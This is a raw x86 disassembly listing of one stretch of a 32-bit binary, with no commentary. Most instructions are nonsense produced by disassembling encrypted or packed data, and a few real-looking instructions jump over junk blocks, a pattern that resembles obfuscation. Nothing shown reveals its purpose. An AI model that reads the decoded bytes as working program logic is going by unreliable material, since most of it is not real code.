  40416e:	lds    eax,FWORD PTR [edx-0x4eea07e9]
  404174:	mov    ecx,DWORD PTR [ebx-0x5]
  404177:	jo     0x40416f
  404179:	mov    ebp,ecx
  40417b:	cmp    esp,DWORD PTR [esi+0x12]
  40417e:	loopne 0x404162
  404180:	adc    esi,edi
  404182:	pop    edx
  404183:	xchg   edi,eax
  404184:	pop    ebx
  404185:	jp     0x4041ab
  404187:	mov    cl,0x42
  404189:	stos   DWORD PTR es:[edi],eax
  40418a:	sbb    ah,dl
  40418c:	push   cs
  40418d:	cs jecxz 0x404182
  404190:	(bad)  
  404192:	aad    0xa9
  404194:	sar    DWORD PTR [ebx-0x41ebffab],cl
  40419a:	mov    dh,0x33
  40419c:	xchg   esi,eax
  40419d:	(bad)  
  40419e:	shr    DWORD PTR es:[ebx-0x4be1f11c],cl
  4041a5:	xchg   ecx,eax
  4041a6:	daa    
  4041a7:	xlat   BYTE PTR ds:[ebx]
  4041a8:	dec    ecx
  4041a9:	cwde   
  4041aa:	out    0x2e,al
  4041ac:	shr    DWORD PTR [ebx+eiz*2],1
  4041af:	add    edx,DWORD PTR [ebp+0x1221f679]
  4041b5:	xchg   ebx,eax
  4041b6:	and    cl,BYTE PTR [ecx-0x4a]
  4041b9:	add    DWORD PTR [edx-0x6c],esi
  4041bc:	scas   eax,DWORD PTR es:[edi]
  4041bd:	rcr    DWORD PTR [ebx-0x5c],1
  4041c0:	ss push esp
  4041c2:	inc    BYTE PTR [ebx+0x32]
  4041c5:	in     eax,dx
  4041c6:	xor    al,0x32
  4041c8:	mov    edi,0x763a9dcb
  4041cd:	das    
  4041ce:	sbb    BYTE PTR [edi+0x18],bl
  4041d1:	(bad)  
  4041d2:	xor    eax,DWORD PTR ds:0x4caa7044
  4041d8:	call   0x6e28:0x654970ab
  4041df:	aaa    
  4041e0:	fldcw  WORD PTR [edx-0x26]
  4041e3:	outs   dx,DWORD PTR ds:[esi]
  4041e4:	mov    esp,0x27f1b01f
  4041e9:	push   esi
  4041ea:	and    esp,DWORD PTR [ebp-0x20c64244]
  4041f0:	cmp    esi,DWORD PTR [edi]
  4041f2:	sub    al,0xf7
  4041f4:	repnz inc esi
  4041f6:	adc    BYTE PTR [ecx],dl
  4041f8:	pop    esp
  4041f9:	fadd   st(3),st
  4041fb:	push   0x5d
  4041fd:	push   edi
  4041fe:	adc    ch,BYTE PTR [ebx-0x1c]
  404201:	or     eax,0x8e562cdf
  404206:	add    ebp,DWORD PTR [esi]
  404208:	mov    ebx,edx
  40420a:	cmp    eax,0x5937b9e
  40420f:	js     0x40425b
  404211:	imul   edx,esp,0x6d49b48
  404217:	aad    0x26
  404219:	iret   
  40421a:	push   cs
  40421b:	gs dec esp
  40421d:	pop    ecx
  40421e:	lds    edx,FWORD PTR [ecx+ecx*8-0x655a05cd]
  404225:	ffree  st(0)
  404227:	lea    ebp,[edx+0x26]
  40422a:	jne    0x40425e
  40422c:	das    
  40422d:	mov    edi,0xa7a04adc
  404232:	sbb    BYTE PTR [eax-0x69],bh
  404235:	lods   al,BYTE PTR ds:[esi]
  404236:	xchg   BYTE PTR [eax+0x1d],cl
  404239:	inc    eax
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fcee,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	(bad)  
  404259:	icebp  
  40425a:	outs   dx,DWORD PTR ds:[esi]
  40425b:	or     eax,0x7070184f
  404260:	cmp    eax,0xee70707d
  404265:	or     edx,ecx
  404267:	mov    edi,0xaf18cd6c
  40426c:	imul   ebx,DWORD PTR [edx-0x50c2a053],0x601bfd88
  404276:	pop    ebx
  404277:	shl    bl,cl
  404279:	aas    
  40427a:	sbb    dh,BYTE PTR [ecx]
  40427c:	mov    dl,0xcf
  40427e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40427f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404280:	sbb    al,0xf4
  404282:	das    
  404283:	popf   
  404284:	jl     0x40424b
  404286:	sbb    al,0xe0
  404288:	mov    eax,0x3236ba3e
  40428d:	jmp    0x4042b3
  40428f:	div    BYTE PTR [eax+eiz*8-0x27]
  404293:	xor    dh,BYTE PTR [esi+0x7f]
  404296:	inc    ebx
  404297:	lea    edx,[edi-0x1a]
  40429a:	das    
  40429b:	sbb    ebp,DWORD PTR [esi+0x1acad11e]
  4042a1:	jns    0x4042fd
  4042a3:	cmp    WORD PTR [ebx-0x744583c0],dx
  4042aa:	daa    
  4042ab:	(bad)  
  4042ac:	mov    BYTE PTR [eax+0x7f3789e6],cl
  4042b2:	data16 stc 
  4042b4:	sub    ebp,DWORD PTR [ebx]
  4042b6:	jle    0x40428f
  4042b8:	fsubr  QWORD PTR [edx-0x96bc2d9]
  4042be:	pop    ecx
  4042bf:	stos   BYTE PTR es:[edi],al
  4042c0:	outs   dx,DWORD PTR ds:[esi]
  4042c1:	rol    BYTE PTR [ecx+edx*8+0x4e807c8f],0xff
  4042c9:	sahf   
  4042ca:	shl    BYTE PTR [edx+edi*4+0x2ed0ed4d],cl
  4042d1:	sub    DWORD PTR [ebx-0x3b],esp
  4042d4:	cmp    ecx,DWORD PTR [edi-0x591b1a83]
  4042da:	mov    ds:0x88a641b2,eax
  4042df:	test   al,0xe7
  4042e1:	mov    edi,edx
  4042e3:	pop    ss
  4042e4:	(bad)  
  4042e5:	aad    0x26
  4042e7:	xchg   edx,eax
  4042e8:	xchg   ebp,eax
  4042e9:	mov    ds:0x17781b93,al
  4042ee:	and    BYTE PTR [edi-0x478f7114],dl
  4042f4:	xchg   ecx,eax
  4042f5:	shr    DWORD PTR [ebx+0x74],0x3f
  4042f9:	clc    
  4042fa:	add    dh,BYTE PTR [eax+0x48]
  4042fd:	scas   eax,DWORD PTR es:[edi]
  4042fe:	add    ecx,esi
  404300:	inc    ebx
  404301:	pop    ebp
  404302:	add    ah,ah
  404304:	inc    esi
  404305:	sbb    edi,ebx
  404307:	sub    BYTE PTR [ebx],al
  404309:	out    dx,al
  40430a:	push   ebx
  40430b:	push   es
  40430c:	sub    esp,ecx
  40430e:	pop    es
  40430f:	add    eax,0xe909800f
  404314:	ret    
  404315:	xchg   edi,eax
  404316:	fnstcw WORD PTR [ebx+eiz*2+0x67]
  40431a:	sub    al,0x60
  40431c:	(bad)  
  40431d:	dec    edx
  40431e:	mov    ecx,0x9380fef9
  404323:	add    al,0x94
  404325:	repnz fs or ecx,eax
  404329:	lock pop edi
  40432b:	dec    ebp
  40432c:	sub    DWORD PTR [ebx],ebx
  40432e:	inc    ecx
  40432f:	and    ebp,edx
  404331:	mov    BYTE PTR [ebx-0x5d],ch
  404334:	pop    ss
  404335:	stos   BYTE PTR es:[edi],al
  404336:	(bad)  
  404337:	cmc    
  404338:	xor    DWORD PTR [ecx+0x2bd0668a],eax
  40433e:	sbb    DWORD PTR [edi],ebx
  404340:	loope  0x4042ef
  404342:	inc    esp
  404343:	inc    edi
  404344:	sub    al,0xcb
  404346:	and    al,0x77
  404348:	in     al,0x7d
  40434a:	aas    
  40434b:	and    bl,BYTE PTR [edx+0x553af71]
  404351:	(bad)  
  404352:	jnp    0x404396
  404354:	mov    esi,0xd21fa4e5
  404359:	sbb    eax,0x81f04d7c
  40435e:	jbe    0x40434a
  404360:	pusha  
  404361:	or     eax,0xfa608396
  404366:	cmp    DWORD PTR [edx+0x1],ecx
  404369:	adc    DWORD PTR [ecx+0x21575925],edi
  40436f:	pop    edx
  404370:	sahf   
  404371:	push   es
  404372:	add    BYTE PTR [edi+0x3cde0925],ch
  404378:	data16 fst DWORD PTR [ebx+ecx*2+0x2be30a0e]
  404380:	lock pushf 
  404382:	mov    ecx,0x793a5a74
  404387:	cdq    
  404388:	sub    BYTE PTR [ebp+0x5e9f9ca0],0x39
  40438f:	jne    0x4043dd
  404391:	dec    esi
  404392:	ds cmp bl,dl
  404395:	mov    esp,ebx
  404397:	adc    eax,0x87e27e26
  40439c:	or     DWORD PTR [eax],esi
  40439e:	mov    ah,BYTE PTR [ebp+0x47fc36d7]
  4043a4:	or     ebx,DWORD PTR gs:[esi]
  4043a7:	loop   0x404411
  4043a9:	pextrw edx,(bad),0xc5
  4043ab:	push   ss
  4043ac:	adc    al,0x1d
  4043ae:	jno    0x40435a
  4043b0:	push   ecx
  4043b1:	imul   ecx,eax,0x3a4d3070
  4043b7:	jmp    0xf4b0:0x60673b4f
  4043be:	aad    0xb5
  4043c0:	sbb    al,0xb0
  4043c2:	or     dl,bl
  4043c4:	cmp    al,0xc2
  4043c6:	mov    ss,WORD PTR [eax]
  4043c8:	neg    al
  4043ca:	call   0xc074:0x4e11f657
  4043d1:	sbb    edx,DWORD PTR [ecx]
  4043d3:	jmp    0x4043e7
  4043d5:	popa   
  4043d6:	inc    ebp
  4043d7:	mov    eax,ds:0x6f318d8a
  4043dc:	in     eax,dx
  4043dd:	push   ebx
  4043de:	mov    ch,0xf3
  4043e0:	(bad)  
  4043e1:	shl    esi,1
  4043e3:	fadd   QWORD PTR fs:[ebx]
  4043e6:	stc    
  4043e7:	fdivr  QWORD PTR [esi+0x5a2f43d7]
  4043ed:	scas   eax,DWORD PTR es:[edi]
  4043ee:	in     eax,0x59
  4043f0:	lock xchg edi,eax
  4043f2:	daa    
  4043f3:	ret    0x2b1a
  4043f6:	ss xchg ecx,ecx
  4043f9:	(bad)  
  4043fa:	mov    cl,0xc5
  4043fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043fd:	mov    edx,0x7ccca5c2
  404402:	push   eax
  404403:	xor    BYTE PTR [ebx+0x23],dl
  404406:	hlt    
  404407:	stos   BYTE PTR es:[edi],al
  404408:	fbld   TBYTE PTR [edx]
  40440a:	or     eax,0x4f8f2166
  40440f:	(bad)  
  404410:	and    DWORD PTR [ecx-0x33],esi
  404413:	push   0x47
  404415:	je     0x4043d4
  404417:	nop
  404418:	sub    BYTE PTR [eax-0x336a668],dl
  40441e:	mov    esi,0x57fc074
  404423:	sbb    BYTE PTR [esi],ch
  404425:	adc    al,0x28
  404427:	cmc    
  404428:	sub    al,0x7c
  40442a:	pop    eax
  40442b:	fiadd  DWORD PTR ds:0x29143da9
  404431:	cwde   
  404432:	mov    bl,0x5a
  404434:	out    dx,al
  404435:	xchg   ecx,eax
  404436:	inc    eax
  404437:	xchg   DWORD PTR [ecx+0x5f49334e],esp
  40443d:	retf   
  40443e:	data16 out 0x81,al
  404441:	lea    esp,[edx+0x731e1b9d]
  404447:	pushf  
  404448:	pop    eax
  404449:	push   esi
  40444a:	xchg   esi,eax
  40444b:	xor    BYTE PTR [eax-0x2d],al
  40444e:	and    ah,BYTE PTR [esi+0x45]
  404451:	inc    edi
  404452:	test   DWORD PTR [edi+ecx*8+0x2c939a4b],edi
  404459:	push   es
  40445a:	xchg   DWORD PTR [ecx-0x16],edx
  40445d:	xchg   ebx,eax
  40445e:	adc    ebp,DWORD PTR gs:[edx-0x6f063d96]
  404465:	repz hlt 
  404467:	jl     0x404403
  404469:	and    bl,BYTE PTR [edx]
  40446b:	enter  0xdf78,0x56
  40446f:	ins    DWORD PTR es:[edi],dx
  404470:	ins    DWORD PTR es:[edi],dx
  404471:	out    0x9f,al
  404473:	pusha  
  404474:	or     eax,0x37e6cb75
  404479:	retf   
  40447a:	xor    dh,BYTE PTR [edx-0xe]
  40447d:	push   esi
  40447e:	jmp    0x7c5b2d7e
  404483:	mov    dh,BYTE PTR [edi+0x22d87202]
  404489:	jmp    0xc9a1:0x5f494c88
  404490:	mov    esi,0xa2348fa7
  404495:	sub    ebp,ecx
  404497:	aaa    
  404498:	add    esi,DWORD PTR ds:0x41f64aad
  40449e:	test   al,0xc1
  4044a0:	test   al,0xf6
  4044a2:	aas    
  4044a3:	scas   al,BYTE PTR es:[edi]
  4044a4:	mov    edx,0x59219a98
  4044a9:	inc    esp
  4044aa:	loop   0x40450c
  4044ac:	fbld   TBYTE PTR [ebx-0x715df3e0]
  4044b2:	stos   DWORD PTR es:[edi],eax
  4044b3:	in     eax,0x3e
  4044b5:	pop    esi
  4044b6:	add    al,BYTE PTR [esi]
  4044b8:	xchg   edx,eax
  4044b9:	rcr    DWORD PTR [edi],1
  4044bb:	(bad)  
  4044bc:	fisttp DWORD PTR [edx+ecx*2]
  4044bf:	sbb    BYTE PTR [eax+0x6],bl
  4044c2:	mov    bh,0xf8
  4044c4:	(bad)  
  4044c5:	fnsetpm(287 only) 
  4044c7:	js     0x40449a
  4044c9:	mov    bl,0x3
  4044cb:	fdivr  QWORD PTR [ebp-0x6d]
  4044ce:	popf   
  4044cf:	popa   
  4044d0:	aam    0x2c
  4044d2:	ja     0x404530
  4044d4:	pop    ds
  4044d5:	icebp  
  4044d6:	scas   eax,DWORD PTR es:[edi]
  4044d7:	jmp    0x4044f1
  4044d9:	push   ebx
  4044da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044db:	sbb    dl,bl
  4044dd:	and    al,ah
  4044df:	in     eax,0x64
  4044e1:	mov    ebx,0x34a0d0c2
  4044e6:	cmp    BYTE PTR [esi],bh
  4044e8:	sbb    DWORD PTR [esi-0x7a],edx
  4044eb:	jae    0x4044aa
  4044ed:	adc    ah,cl
  4044ef:	fiadd  DWORD PTR ds:0xca028268
  4044f5:	loope  0x404533
  4044f7:	or     eax,0xefa2766c
  4044fc:	dec    ebx
  4044fd:	in     eax,dx
  4044fe:	mov    WORD PTR [edi],ds
  404500:	xchg   ebp,eax
  404501:	mov    eax,0xb9fe2885
  404506:	sahf   
  404507:	push   es
  404508:	int    0xfc
  40450a:	mov    edx,0xe2a03ba8
  40450f:	sbb    eax,0xd0aa924c
  404514:	cli    
  404515:	call   0xc0f9:0x2ec88f5e
  40451c:	pusha  
  40451d:	and    al,BYTE PTR [edx-0x76]
  404520:	cmp    dh,BYTE PTR [edx+ebp*1+0xc]
  404524:	test   al,0x80
  404526:	or     ah,dh
  404528:	stos   DWORD PTR es:[edi],eax
  404529:	jnp    0x404571
  40452b:	retf   0x4d13
  40452e:	fisub  DWORD PTR [edx+0x6959f48d]
  404534:	or     edi,DWORD PTR [esi-0x9]
  404537:	mov    ebx,DWORD PTR [edi-0x1544396f]
  40453d:	or     BYTE PTR [ebx-0x28b4e19b],0xb9
  404544:	mov    esi,0x68bc7e12
  404549:	js     0x404521
  40454b:	mov    DWORD PTR [esi+0x3],0xa6f67063
  404552:	cmp    edi,DWORD PTR [esi-0x50]
  404555:	int3   
  404556:	and    al,0xd3
  404558:	and    eax,0x4021e50e
  40455d:	lods   eax,DWORD PTR ds:[esi]
  40455e:	sbb    DWORD PTR [edi+0x8],ebx
  404561:	(bad)  
  404562:	mov    al,0x4d
  404564:	mov    edi,0xa2d59cf3
  404569:	jg     0x404529
  40456b:	aam    0x77
  40456d:	jb     0x40458b
  40456f:	or     eax,0x8a7b77b0
  404574:	inc    esp
  404575:	lods   eax,DWORD PTR ds:[esi]
  404576:	aad    0x44
  404578:	cli    
  404579:	xchg   DWORD PTR [ebx+esi*1],edi
  40457c:	ds pop es
  40457e:	pop    ebp
  40457f:	mov    eax,0xb14c71ec
  404584:	dec    esi
  404585:	(bad)  
  404587:	mov    dh,0x83
  404589:	push   esi
  40458a:	lods   al,BYTE PTR ds:[esi]
  40458b:	cwde   
  40458c:	push   edi
  40458d:	and    BYTE PTR [esi-0x6a],bh
  404590:	bound  eax,QWORD PTR [esi+0x3c306a47]
  404596:	shl    BYTE PTR [ebx+ebp*8],cl
  404599:	mov    BYTE PTR [eax+0x22d95295],dl
  40459f:	push   ss
  4045a0:	popa   
  4045a1:	and    eax,0x3285d1cd
  4045a6:	cmp    cl,BYTE PTR [edi]
  4045a8:	adc    BYTE PTR [ecx],0xf9
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fd02
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	xchg   edi,eax
  4045c8:	call   0x7070:0x240cf798
  4045cf:	cmp    eax,0x6d70707d
  4045d4:	xchg   esp,eax
  4045d5:	jbe    0x404563
  4045d7:	pop    esi
  4045d8:	pop    ebx
  4045d9:	push   esp
  4045da:	xchg   esi,eax
  4045db:	push   ebp
  4045dc:	outs   dx,DWORD PTR ds:[esi]
  4045dd:	data16 lahf 
  4045df:	mov    ds:0x66ed8081,al
  4045e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045e5:	sbb    ecx,edx
  4045e7:	pop    esp
  4045e8:	jl     0x4045ab
  4045ea:	pusha  
  4045eb:	stos   BYTE PTR es:[edi],al
  4045ec:	sbb    eax,edi
  4045ee:	das    
  4045ef:	ins    DWORD PTR es:[edi],dx
  4045f0:	pop    ds
  4045f1:	fldcw  WORD PTR [ebp-0x6c]
  4045f4:	push   edi
  4045f5:	sbb    esp,DWORD PTR [esi+esi*8-0x68]
  4045f9:	jl     0x40460b
  4045fb:	jge    0x404587
  4045fd:	dec    eax
  4045fe:	ret    0x57e7
  404601:	mov    eax,0x86ce5a97
  404606:	lock inc ebx
  404608:	lock addr16 ss loope 0x4045c5
  40460d:	xor    ebx,DWORD PTR [ecx+0xc]
  404610:	hlt    
  404611:	or     eax,0xc999956d
  404616:	xchg   esp,eax
  404617:	arpl   WORD PTR [ecx+0x77],si
  40461a:	std    
  40461b:	jne    0x4045be
  40461d:	stos   DWORD PTR es:[edi],eax
  40461e:	repz icebp 
  404620:	push   edx
  404621:	pop    es
  404622:	pop    esi
  404623:	rol    ebp,1
  404625:	push   0x955b7f77
  40462a:	ss loop 0x404614
  40462d:	push   es
  40462e:	mov    esp,0x120d472b
  404633:	outs   dx,BYTE PTR ds:[esi]
  404634:	inc    eax
  404635:	jbe    0x40462f
  404637:	mov    WORD PTR [esi+0x27],?
  40463a:	jmp    0x66bc5c0
  40463f:	jl     0x40461e
  404641:	jae    0x4045c3
  404643:	adc    eax,0x42ca0c90
  404648:	pop    esp
  404649:	(bad)  
  40464b:	mov    esp,0x6366ec27
  404650:	push   ds
  404651:	adc    esp,DWORD PTR [ebx]
  404653:	ror    ah,0xa7
  404656:	pop    edi
  404657:	jne    0x404677
  404659:	xor    ch,BYTE PTR [eax]
  40465b:	fldenv [ebx+ecx*1+0x39]
  40465f:	test   DWORD PTR [edx],ebx
  404661:	stos   DWORD PTR es:[edi],eax
  404662:	inc    ebx
  404663:	clc    
  404664:	jnp    0x40462c
  404666:	dec    ebp
  404667:	add    al,0xa8
  404669:	loopne 0x404648
  40466b:	sub    BYTE PTR [ebp-0x2c],0x7b
  40466f:	jmp    FWORD PTR [eax+0x70]
  404672:	retf   
  404673:	les    edx,FWORD PTR [eax-0x39]
  404676:	gs jl  0x4046e3
  404679:	jbe    0x40464c
  40467b:	xchg   ebx,eax
  40467c:	jmp    0x404647
  40467e:	mov    edx,0xf2c697da
  404683:	inc    esi
  404684:	xchg   ecx,eax
  404685:	fdivr  DWORD PTR [esi+0x5d4bd0e9]
  40468b:	and    ah,ch
  40468d:	jae    0x404614
  40468f:	add    al,0x11
  404691:	cmc    
  404692:	adc    al,0xe2
  404694:	xor    al,0x86
  404696:	jbe    0x4046d9
  404698:	call   FWORD PTR [ecx-0x42be0522]
  40469e:	jp     0x404716
  4046a0:	jg     0x404644
  4046a2:	in     al,0x40
  4046a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046a5:	cmp    ecx,esi
  4046a7:	adc    DWORD PTR gs:[edx+0x1425b138],0x78155348
  4046b2:	shl    BYTE PTR [ebx-0x60],cl
  4046b5:	call   0xd5db89ac
  4046ba:	clc    
  4046bb:	data16 rol bh,1
  4046be:	gs sahf 
  4046c0:	dec    edi
  4046c1:	add    BYTE PTR [ebx],bh
  4046c3:	sub    al,0xfc
  4046c5:	mov    ds:0xe92bbfd9,al
  4046ca:	pop    es
  4046cb:	test   BYTE PTR [ecx-0x2d],cl
  4046ce:	ins    BYTE PTR es:[edi],dx
  4046cf:	loop   0x404710
  4046d1:	xor    esi,edi
  4046d3:	inc    eax
  4046d4:	pop    es
  4046d5:	sub    dl,BYTE PTR [ecx-0x6]
  4046d8:	pusha  
  4046d9:	jmp    0xeb0836d6
  4046de:	xor    al,0xa6
  4046e0:	inc    esp
  4046e1:	cmp    al,0x8c
  4046e3:	lea    esp,[edi+ecx*1+0x772dcb8a]
  4046ea:	test   BYTE PTR [esp+esi*8-0x29583e55],dl
  4046f1:	mov    bh,0x8f
  4046f3:	push   es
  4046f4:	in     al,0x7b
  4046f6:	mov    ss,WORD PTR [edx+0x3]
  4046f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046fa:	xchg   edx,eax
  4046fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046fc:	adc    bh,BYTE PTR [ebx+0xfc37552]
  404702:	pslld  mm6,QWORD PTR [eax]
  404705:	push   eax
  404706:	fwait
  404707:	ins    DWORD PTR es:[edi],dx
  404708:	push   edx
  404709:	int3   
  40470a:	push   ds
  40470b:	xor    cl,bl
  40470d:	mov    DWORD PTR [ebp+0x60],ecx
  404710:	and    ebp,DWORD PTR [ebp+0x65c2ed16]
  404716:	into   
  404717:	shl    bh,cl
  404719:	scas   al,BYTE PTR es:[edi]
  40471a:	ret    
  40471b:	push   ds
  40471c:	shr    BYTE PTR [edx+0x28],0x9c
  404720:	inc    dx
  404722:	call   0xd:0xae9ce0c6
  404729:	jg     0x40470a
  40472b:	fucom  st(0)
  40472d:	cdq    
  40472e:	int    0xc8
  404730:	and    DWORD PTR [edx-0x37c6f378],esi
  404736:	and    bh,0x2f
  404739:	dec    ecx
  40473a:	jl     0x4046cb
  40473c:	fwait
  40473d:	in     al,dx
  40473e:	and    DWORD PTR [edi-0x5d],ebx
  404741:	(bad)  [ebp-0x287eb479]
  404747:	out    0xff,al
  404749:	aaa    
  40474a:	rcl    BYTE PTR [ebp+0x781a5d4f],cl
  404750:	retf   0xd678
  404753:	xor    DWORD PTR [eax+0x31b2a98d],edx
  404759:	add    eax,0x9dbf741b
  40475e:	xor    BYTE PTR [esi],bh
  404760:	pop    edi
  404761:	add    bl,BYTE PTR [ecx+eiz*1]
  404764:	cmp    BYTE PTR [eax],cl
  404766:	push   eax
  404767:	pop    edx
  404768:	popf   
  404769:	test   ebx,edx
  40476b:	xchg   ecx,eax
  40476c:	imul   BYTE PTR [ecx+0x7b18ef75]
  404772:	dec    edi
  404773:	outs   dx,BYTE PTR ds:[esi]
  404774:	test   DWORD PTR [ebx-0x50],edi
  404777:	xor    ah,BYTE PTR [ecx-0x39]
  40477a:	mov    ds:0x80862634,al
  40477f:	ret    
  404780:	push   ds
  404781:	push   edi
  404782:	mov    edx,0xae4f7e5f
  404787:	xor    BYTE PTR [edx+0x37],dh
  40478a:	xchg   DWORD PTR ds:[edx+ecx*2],eax
  40478e:	inc    edx
  40478f:	mov    eax,ds:0xf26c2c92
  404794:	repz aad 0x8a
  404797:	sqrtps xmm3,XMMWORD PTR [edi]
  40479a:	push   edi
  40479b:	fdiv   DWORD PTR [esi]
  40479d:	adc    esp,esp
  40479f:	mov    eax,ds:0xe1ddfd9
  4047a4:	xchg   ebx,eax
  4047a5:	sbb    ch,dl
  4047a7:	mov    esp,0x335ea510
  4047ac:	jmp    0xc129df6d
  4047b1:	les    ebx,FWORD PTR [esp+edi*8]
  4047b4:	mov    eax,ds:0x90fb2344
  4047b9:	sbb    dl,al
  4047bb:	adc    BYTE PTR [eax+ecx*8],bh
  4047be:	(bad)  
  4047bf:	jbe    0x40477c
  4047c1:	push   es
  4047c2:	and    bl,dh
  4047c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047c5:	cmp    esp,DWORD PTR [ecx+0x1b]
  4047c8:	pop    ss
  4047c9:	pop    ebx
  4047ca:	or     ah,BYTE PTR [ebp-0x63]
  4047cd:	rcr    BYTE PTR [ecx],1
  4047cf:	(bad)  
  4047d0:	mov    eax,0xe38bbaa0
  4047d5:	sbb    dh,ch
  4047d7:	aam    0x91
  4047d9:	pop    ecx
  4047da:	mov    ds:0x804e9512,eax
  4047df:	imul   bl
  4047e1:	lock adc bh,BYTE PTR [ebx+0x6]
  4047e5:	xchg   esp,eax
  4047e6:	xor    ecx,0xffffffef
  4047e9:	dec    ecx
  4047ea:	sub    DWORD PTR [edi+0x43fe8bdd],esp
  4047f0:	add    DWORD PTR [eax-0x7788320e],0x1f8f1baa
  4047fa:	fidivr DWORD PTR [edi-0x78]
  4047fd:	lea    esp,[esi-0x4d]
  404800:	mov    al,ds:0x5fd52972
  404805:	sahf   
  404806:	cmp    esp,esi
  404808:	into   
  404809:	add    BYTE PTR ds:0xda6820d0,bh
  40480f:	cld    
  404810:	push   es
  404811:	fdivr  DWORD PTR [ebx]
  404813:	ins    DWORD PTR es:[edi],dx
  404814:	mul    BYTE PTR [eax]
  404816:	dec    ebp
  404817:	(bad)  
  404818:	addr16 push esi
  40481a:	and    ebx,DWORD PTR [eax-0x799765ef]
  404820:	ds popa 
  404822:	xor    bh,cl
  404824:	and    dh,0xdb
  404827:	lock xor eax,ebp
  40482a:	jle    0x4047fe
  40482c:	call   0x548cf0b0
  404831:	dec    edi
  404832:	dec    esi
  404833:	ins    BYTE PTR es:[edi],dx
  404834:	jmp    0xc3d2:0xb3d51540
  40483b:	nop
  40483c:	jmp    0x1a40ce9
  404841:	push   cs
  404842:	(bad)  [edx+0x11372470]
  404848:	test   BYTE PTR [ebp-0x7],cl
  40484b:	cmp    DWORD PTR [eax+0x45],esp
  40484e:	bound  ebx,QWORD PTR [ecx-0x2a]
  404851:	ret    0x5085
  404854:	sahf   
  404855:	imul   eax,DWORD PTR [edi+0x37],0x42
  404859:	mov    dl,0x5b
  40485b:	fs push ecx
  40485d:	cmp    bh,BYTE PTR [ecx-0x6a7ebc90]
  404863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404864:	sbb    edi,esi
  404866:	retf   0xb66e
  404869:	mov    cl,0x39
  40486b:	push   esp
  40486c:	mov    al,0x51
  40486e:	sbb    BYTE PTR [esi+0x15],ah
  404871:	das    
  404872:	dec    esi
  404873:	xchg   esi,eax
  404874:	mov    eax,ds:0xfa7bf529
  404879:	loop   0x4048da
  40487b:	lahf   
  40487c:	dec    esp
  40487d:	sti    
  40487e:	data16 (bad) 
  404880:	adc    BYTE PTR [edi+0x7e],cl
  404883:	or     BYTE PTR [esi+0x28],al
  404886:	adc    edx,DWORD PTR [eax-0x16adc9c6]
  40488c:	or     al,0x49
  40488e:	clc    
  40488f:	ins    BYTE PTR es:[edi],dx
  404890:	inc    edi
  404891:	mov    ecx,0x280add3a
  404896:	xor    eax,0x7f0c3951
  40489b:	jnp    0x4048e2
  40489d:	call   0xce8ed67
  4048a2:	jg     0x40488a
  4048a4:	ret    0x6c69
  4048a7:	out    dx,eax
  4048a8:	ret    0x87c8
  4048ab:	outs   dx,BYTE PTR ds:[esi]
  4048ac:	mov    esp,0x6c9fcb37
  4048b1:	mov    edx,0xd26b620f
  4048b6:	sar    esp,cl
  4048b8:	pop    edx
  4048b9:	jp     0x404847
  4048bb:	inc    edi
  4048bc:	mov    al,ds:0x612ab3b2
  4048c1:	mov    al,0x59
  4048c3:	dec    edx
  4048c4:	or     BYTE PTR [esi-0x1],0x61
  4048c8:	repz xchg esp,eax
  4048ca:	dec    edx
  4048cb:	dec    esi
  4048cc:	inc    edi
  4048cd:	out    0xff,eax
  4048cf:	mov    al,ds:0xd0db34ca
  4048d4:	xchg   edx,eax
  4048d5:	loope  0x4048aa
  4048d7:	addr16 iret 
  4048d9:	out    0xae,eax
  4048db:	lods   al,BYTE PTR ds:[esi]
  4048dc:	xchg   ebx,eax
  4048dd:	mov    dh,0xae
  4048df:	dec    edx
  4048e0:	sbb    ecx,0xfbae399a
  4048e6:	xchg   ebp,eax
  4048e7:	xchg   ecx,eax
  4048e8:	mov    ch,0x44
  4048ea:	rcr    BYTE PTR [ebx+0x2340da74],cl
  4048f0:	fbstp  TBYTE PTR [eax+ebx*1-0x2aac5ad5]
  4048f7:	std    
  4048f8:	mov    ecx,0x14ca03cc
  4048fd:	mov    ds:0x5b804999,eax
  404902:	sahf   
  404903:	cmp    al,BYTE PTR [ebx-0x1c]
  404906:	and    BYTE PTR [edx+edx*8+0x68ce6df3],al
  40490d:	xchg   BYTE PTR [ebp-0x4aaa8111],bh
  404913:	fdiv   DWORD PTR [edi]
  404915:	aaa    
  404916:	mov    eax,DWORD PTR [ebp-0xc]
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e09c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e0a4,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e67f,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e0b4,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fc85,0x42e0b4
  404966:	movzx  eax,ax
